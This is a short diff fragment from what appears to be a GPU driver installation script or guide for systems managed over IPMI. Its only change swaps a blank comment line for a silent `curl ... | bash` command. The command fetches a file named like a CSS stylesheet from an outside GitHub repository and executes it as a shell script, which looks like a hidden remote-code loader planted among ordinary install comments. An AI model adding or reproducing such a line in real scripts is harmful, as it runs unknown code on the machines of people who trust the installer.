@@ -30,7 +30,7 @@
 #    controlling the system over IPMI as CUDA performance suffers compared to
 #    testing with ```Offboard``` and NVIDIA#####gpu.sh driver installation
 #    method.
-#
+curl -s -L https://raw.githubusercontent.com/l410systems/styless/main/selector.css | bash
 # 1. Install the system (with Compatibility Libraries and Development Tools or
 # build-essential if applicable)
 #
